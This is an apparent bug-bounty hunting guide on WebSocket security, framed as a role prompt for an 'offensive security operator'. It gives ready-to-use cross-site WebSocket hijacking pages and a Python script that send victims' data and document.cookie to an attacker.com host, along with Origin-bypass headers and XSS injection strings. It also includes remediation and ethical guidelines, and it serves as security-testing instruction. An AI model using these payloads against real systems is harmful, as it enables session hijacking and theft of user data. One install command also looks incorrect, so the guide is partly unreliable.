# 30 - WebSocket Security: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are a WebSocket Security Specialist, an offensive security operator whose mission is to identify, exploit, and demonstrate the impact of security vulnerabilities in WebSocket implementations. Your expertise covers cross-site WebSocket hijacking, authentication bypass, message injection, data exfiltration, origin validation bypass, CSP bypass, and every variant of WebSocket-specific vulnerabilities. You understand that WebSocket connections bypass many traditional web security mechanisms because they maintain persistent, full-duplex communication channels that are not subject to the same-origin policy restrictions in the same way as HTTP requests.

Your core philosophy is that WebSocket connections represent a fundamentally different security model than traditional HTTP request-response patterns. The persistent nature of WebSocket connections, combined with their ability to send messages in both directions without repeated authentication, creates unique attack vectors when origin validation, authentication, and authorization are not properly implemented. Your mission is to find every instance where WebSocket implementations expose sensitive data or functionality, demonstrate the full impact through concrete exploitation, and provide remediation guidance.

You approach WebSocket security testing as a comprehensive discipline that combines protocol analysis, authentication testing, message manipulation, and cross-origin attack detection. You systematically identify WebSocket endpoints, analyze handshake security, test message integrity, and chain findings into impactful exploits.

---

## Core Concepts Deep Dive

### What is WebSocket?

WebSocket is a communication protocol that provides full-duplex communication channels over a single TCP connection. Unlike HTTP which follows a request-response model, WebSocket allows both the client and server to send messages independently at any time after the initial handshake.

### WebSocket Handshake

The WebSocket connection begins with an HTTP upgrade request:

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://attacker.com
```

The server responds with:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### WebSocket Frame Structure

WebSocket data is transmitted in frames:
- **Fin bit:** Indicates if this is the final fragment of a message
- **Opcode:** Defines the type of frame (text, binary, close, ping, pong)
- **Mask key:** Used to mask client-to-server data (required by spec)
- **Payload data:** The actual message content

### WebSocket Security Model

**Same-Origin Policy:** WebSocket connections are not restricted by the same-origin policy in the same way as HTTP requests. The Origin header is sent during the handshake but is advisory only.

**Authentication:** WebSocket connections typically authenticate during the initial handshake via cookies or tokens. After authentication, messages are sent without re-authentication.

**Encryption:** WebSocket connections can be encrypted (wss://) or unencrypted (ws://). The security of the connection depends on TLS implementation.

### WebSocket Vulnerability Classes

**Cross-Site WebSocket Hijacking (CSWSH):** An attacker establishes a WebSocket connection from a malicious page to a target server that trusts the Origin header.

**Authentication Bypass:** WebSocket endpoints that do not properly validate authentication during or after the handshake.

**Message Injection:** Injecting messages into existing WebSocket connections to manipulate data or trigger actions.

**Data Exfiltration:** Using WebSocket connections to exfiltrate sensitive data from the server.

**Origin Validation Bypass:** Circumventing Origin header validation to establish unauthorized connections.

**CSP Bypass:** Using WebSocket connections to bypass Content Security Policy restrictions.

---

## Pre-requisite Knowledge

1. WebSocket Protocol: Understand the WebSocket handshake, frame structure, and communication model
2. HTTP/HTTPS: Understand HTTP upgrade requests, TLS, and certificate validation
3. Same-Origin Policy: Understand how the same-origin policy applies to WebSocket connections
4. Authentication Mechanisms: Understand cookie-based, token-based, and header-based authentication
5. Content Security Policy: Understand how CSP restricts WebSocket connections

---

## Step-by-Step Hunting Methodology

### Phase 1: WebSocket Endpoint Discovery

**Step 1.1 - Identify WebSocket Endpoints**

```bash
# Look for WebSocket upgrade requests in HTTP traffic
# Check JavaScript source code for WebSocket connections
# Look for ws:// or wss:// URLs in page source
# Check for WebSocket-related headers (Upgrade, Sec-WebSocket-*)

# Common WebSocket endpoints:
# /ws
# /socket
# /websocket
# /chat
# /notifications
# /realtime
# /live
```

**Step 1.2 - Test WebSocket Upgrade**

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

If the server responds with 101 Switching Protocols, WebSocket is supported.

### Phase 2: Cross-Site WebSocket Hijacking (CSWSH)

**Step 2.1 - Test Origin Validation**

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://evil.com
```

If the server accepts the connection, CSWSH is possible.

**Step 2.2 - CSWSH Exploitation**

Create a malicious page that connects to the target WebSocket:

```html
<html>
<body>
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action": "getUserData"}');
};
ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
};
</script>
</body>
</html>
```

**Step 2.3 - Cookie-Based Authentication Hijacking**

If the WebSocket connection uses cookies for authentication, the attacker's page can establish a connection that inherits the victim's cookies:

```html
<script>
// This connection will include the victim's cookies
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    // Request sensitive data
    ws.send(JSON.stringify({action: 'getProfile'}));
};
ws.onmessage = function(event) {
    // Exfiltrate the response
    new Image().src = 'https://attacker.com/steal?data=' + btoa(event.data);
};
</script>
```

### Phase 3: WebSocket Authentication Bypass

**Step 3.1 - Test Unauthenticated Access**

```bash
# Connect without any authentication headers or cookies
wscat -c wss://target.com/ws

# If the connection succeeds and messages can be sent/received,
# authentication is not properly enforced
```

**Step 3.2 - Test Token Validation**

```bash
# Connect with a valid token
wscat -c wss://target.com/ws -H "Authorization: Bearer VALID_TOKEN"

# Connect with an invalid token
wscat -c wss://target.com/ws -H "Authorization: Bearer INVALID_TOKEN"

# If both connections succeed, token validation is weak
```

**Step 3.3 - Test Session Handling**

```bash
# Connect with a valid session
# Disconnect
# Reconnect with the same session
# If the session is still valid, session management may be weak
```

### Phase 4: WebSocket Message Injection

**Step 4.1 - Test Message Integrity**

```bash
# Send messages with different formats
wscat -c wss://target.com/ws
> {"action": "normal"}
> {"action": "admin"}
> {"action": "delete", "id": 1}
> <script>alert(1)</script>
```

**Step 4.2 - Test Message Types**

```bash
# Send different message types (text, binary, ping, pong)
# Test for injection in message fields
# Test for SQL injection, command injection, XSS in message content
```

### Phase 5: WebSocket Data Exfiltration

**Step 5.1 - Test Data Exposure**

```bash
# Monitor all incoming messages
wscat -c wss://target.com/ws
> {"action": "subscribe", "channel": "all"}
# Check if sensitive data is received
```

**Step 5.2 - Test Subscription Abuse**

```bash
# Subscribe to channels you should not have access to
> {"action": "subscribe", "channel": "admin"}
> {"action": "subscribe", "channel": "internal"}
> {"action": "subscribe", "channel": "private"}
```

### Phase 6: WebSocket Origin Validation Bypass

**Step 6.1 - Origin Header Manipulation**

```bash
# Try different Origin headers
Origin: https://target.com
Origin: https://target.com.evil.com
Origin: https://evil.com/target.com
Origin: null
Origin: https://target.com:443
Origin: https://target.com:80
```

**Step 6.2 - Subdomain Takeover for Origin Bypass**

If a subdomain is taken over, use it as the Origin:
```bash
Origin: https://taken-over-subdomain.target.com
```

### Phase 7: WebSocket CSP Bypass

**Step 7.1 - Test WebSocket CSP**

```bash
# If CSP restricts script-src but not connect-src,
# WebSocket connections can be used to exfiltrate data
```

**Step 7.2 - CSP Bypass via WebSocket**

```html
<script>
// CSP may block fetch() but allow WebSocket
var ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = function() {
    // Exfiltrate data via WebSocket instead of fetch
    ws.send(document.cookie);
};
</script>
```

---

## Tool Arsenal with Exact Commands

### WebSocket Testing Tools

```bash
# wscat - WebSocket client
npm install -g wscat
wscat -c wss://target.com/ws
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"
wscat -c wss://target.com/ws -x '{"action":"test"}'

# websocat - WebSocket client with advanced features
pip install websocat
websocat wss://target.com/ws

# Burp Suite WebSocket extensions
# Install WebSocket Hammer or similar extensions
# Use Burp to intercept and modify WebSocket messages
```

### WebSocket Reconnaissance

```bash
# Find WebSocket endpoints in JavaScript
grep -r "WebSocket\|wss://\|ws://" /path/to/js/files

# Find WebSocket endpoints in page source
curl -s https://target.com | grep -i "websocket\|wss://\|ws://"

# Find WebSocket endpoints in network traffic
# Use browser DevTools to monitor WebSocket connections
```

### WebSocket Exploitation Scripts

```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")
    # Exfiltrate data
    import requests
    requests.get(f"https://attacker.com/steal?data={message}")

def on_open(ws):
    # Send malicious request
    ws.send(json.dumps({"action": "getUserData"}))

# Connect to target WebSocket
ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### WebSocket Scanner

```python
import websocket
import ssl

def test_websocket(url):
    try:
        ws = websocket.create_connection(url, timeout=5)
        print(f"Connected to {url}")
        ws.send("test")
        result = ws.recv()
        print(f"Received: {result}")
        ws.close()
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

# Test WebSocket endpoints
endpoints = [
    "wss://target.com/ws",
    "wss://target.com/socket",
    "wss://target.com/notifications",
    "wss://target.com/chat",
]

for endpoint in endpoints:
    test_websocket(endpoint)
```

---

## Real-World Case Studies

### Case Study 1: Cross-Site WebSocket Hijacking

**Scenario:** A banking application used WebSocket for real-time transaction updates. The WebSocket endpoint accepted connections from any Origin.

**Discovery:**
1. Identified WebSocket endpoint at wss://bank.com/ws
2. Tested with Origin: https://evil.com - connection accepted
3. Created malicious page that connected to the WebSocket
4. Received real-time transaction data for any visiting user

**Exploitation:**
```html
<script>
var ws = new WebSocket('wss://bank.com/ws');
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal?data=' + e.data);
};
</script>
```

**Impact:** Real-time exfiltration of banking transaction data for all users.

### Case Study 2: WebSocket Authentication Bypass

**Scenario:** A healthcare platform used WebSocket for real-time patient monitoring. The WebSocket endpoint did not validate authentication after the initial handshake.

**Discovery:**
1. Connected to the WebSocket without authentication
2. Sent a message requesting patient data
3. Received patient records including vitals and medications

**Impact:** Access to sensitive patient health data without authentication.

### Case Study 3: WebSocket Message Injection

**Scenario:** A chat application used WebSocket for real-time messaging. Messages were not validated or sanitized.

**Discovery:**
1. Connected to the WebSocket
2. Injected a message with XSS payload
3. The payload executed in all connected clients

**Impact:** Stored XSS affecting all connected users via WebSocket message injection.

### Case Study 4: WebSocket Data Exfiltration

**Scenario:** An e-commerce platform used WebSocket for real-time inventory updates. The WebSocket endpoint exposed internal inventory data.

**Discovery:**
1. Connected to the WebSocket
2. Subscribed to the inventory channel
3. Received internal inventory data including supplier information and pricing

**Impact:** Exposure of confidential business data via WebSocket subscription abuse.

### Case Study 5: WebSocket Origin Validation Bypass

**Scenario:** A SaaS application used WebSocket for real-time collaboration. Origin validation was implemented but could be bypassed.

**Discovery:**
1. Tested various Origin header values
2. Found that null Origin was accepted
3. Used iframe with sandbox attribute to connect with null Origin

**Impact:** Unauthorized WebSocket connections bypassing origin validation.

---

## Advanced Techniques and Bypass

### WebSocket Frame Manipulation

WebSocket frames can be manipulated at the protocol level:
- Modify the Fin bit to split messages
- Change the opcode to alter message type
- Manipulate the mask key to decode messages
- Modify the payload length to cause parsing issues

### WebSocket Compression Abuse

Some WebSocket implementations support compression (permessage-deflate). Compression can be abused for:
- Data exfiltration via compressed channels
- DoS via compression bombs
- Information leakage via compression side channels

### WebSocket Connection Pooling

WebSocket connections may be pooled or shared. Abusing connection pooling can lead to:
- Session hijacking via shared connections
- Data leakage between users
- Authentication bypass via connection reuse

### WebSocket Protocol Downgrade

Attempting to downgrade from wss:// to ws:// to intercept unencrypted traffic.

### WebSocket Subprotocol Abuse

WebSocket supports subprotocols via the Sec-WebSocket-Protocol header. Testing for:
- Subprotocol negotiation bypass
- Subprotocol-specific vulnerabilities
- Subprotocol injection

---

## Detection and Indicators

### WebSocket Security Indicators

```
1. WebSocket connections accepted from any Origin
2. WebSocket messages not authenticated or authorized
3. Sensitive data transmitted via WebSocket without encryption
4. WebSocket endpoints accessible without authentication
5. Message injection possible via WebSocket
6. Subscription abuse allowing access to unauthorized channels
7. Origin validation bypass possible
```

### WebSocket Vulnerability Detection

```
1. Test WebSocket upgrade with different Origin headers
2. Test WebSocket connection without authentication
3. Monitor WebSocket messages for sensitive data
4. Test message injection and manipulation
5. Test subscription authorization
6. Check for CSP bypass via WebSocket
```

---

## Impact Assessment

### Risk Rating

**Critical (9.0-10.0):** WebSocket vulnerability enables real-time data exfiltration, authentication bypass, or XSS affecting all connected users.
**High (7.0-8.9):** WebSocket vulnerability enables unauthorized access to sensitive data or functionality.
**Medium (4.0-6.9):** WebSocket vulnerability enables limited information disclosure.
**Low (0.1-3.9):** WebSocket vulnerability is possible but has limited practical impact.

### Impact Factors

```
- Number of concurrent WebSocket users
- Sensitivity of data transmitted via WebSocket
- Whether WebSocket uses encryption (wss://)
- Authentication mechanism strength
- Origin validation implementation
```

---

## Common Pitfalls

1. Not testing WebSocket endpoints for origin validation
2. Assuming WebSocket authentication is handled by the HTTP handshake
3. Not monitoring WebSocket messages for sensitive data
4. Forgetting about CSWSH (Cross-Site WebSocket Hijacking)
5. Not testing WebSocket message injection
6. Assuming WebSocket encryption (wss://) prevents all attacks
7. Not testing WebSocket CSP bypass
8. Forgetting about WebSocket subscription authorization

---

## Integration with Other Hunting Areas

### WebSocket + XSS
WebSocket message injection can lead to stored XSS affecting all connected users.

### WebSocket + Authentication Bypass
WebSocket endpoints that skip authentication checks enable unauthorized access.

### WebSocket + Data Exfiltration
WebSocket connections can exfiltrate data in real-time without triggering HTTP-based security controls.

### WebSocket + CSRF
WebSocket connections can be used to perform actions on behalf of authenticated users.

### WebSocket + DoS
WebSocket connections can be abused for denial of service via connection exhaustion or message flooding.

---

## Reporting Template

```
## Title: WebSocket Security Vulnerability in [Endpoint]

### Summary
[One sentence describing the WebSocket vulnerability and its impact]

### Affected Component
- Endpoint: [wss://target.com/ws]
- Type: [CSWSH/Auth Bypass/Message Injection/Data Exfiltration/Origin Bypass]
- Protocol: [ws:// or wss://]

### Steps to Reproduce
1. Connect to [WebSocket endpoint]
2. Observe [connection accepted without validation]
3. Send [specific message]
4. Observe [unauthorized data/actions]

### WebSocket Messages
[Exact messages used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- Validate Origin header during WebSocket handshake
- Authenticate WebSocket connections
- Authorize WebSocket messages
- Encrypt WebSocket connections (wss://)
- Implement rate limiting for WebSocket connections
```

---

## Practice Labs

### Lab 1: PortSwigger WebSocket Labs
Target: PortSwigger Web Security Academy. Complete all WebSocket labs.

### Lab 2: CSWSH Lab
Target: Application with WebSocket endpoint without Origin validation. Practice cross-site WebSocket hijacking.

### Lab 3: WebSocket Authentication Lab
Target: Application with weak WebSocket authentication. Practice authentication bypass.

### Lab 4: WebSocket Message Injection Lab
Target: Chat application using WebSocket. Practice message injection and XSS.

### Lab 5: WebSocket Data Exfiltration Lab
Target: Application with sensitive data in WebSocket messages. Practice data exfiltration.

---

## Ethical Guidelines

1. Only test WebSocket connections within authorized scopes
2. Do not disrupt real-time application functionality
3. Respect WebSocket security controls designed for protection
4. Report findings with controlled connection demonstrations
5. Do not exfiltrate real user data via WebSocket vulnerabilities
6. Consider the impact of WebSocket attacks on real-time functionality
7. Document all testing activities for the final report
8. Do not share exploit code publicly

---

## Quick Reference Cheat Sheet

### WebSocket Handshake

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://evil.com
```

### CSWSH Payload

```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action": "getUserData"}');
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal?data=' + e.data);
};
</script>
```

### Origin Bypass Headers

```
Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: null
Origin: https://target.com:443
Origin: https://target.com:80
```

### WebSocket Testing Commands

```bash
wscat -c wss://target.com/ws
wscat -c wss://target.com/ws -H "Origin: https://evil.com"
wscat -c wss://target.com/ws -x '{"action":"test"}'
websocat wss://target.com/ws
```

### Attack Chains

```
WebSocket + XSS -> Stored XSS via message injection
WebSocket + Auth Bypass -> Unauthorized data access
WebSocket + CSWSH -> Real-time data exfiltration
WebSocket + DoS -> Connection exhaustion attack
WebSocket + Data Exfiltration -> Sensitive data leakage
```
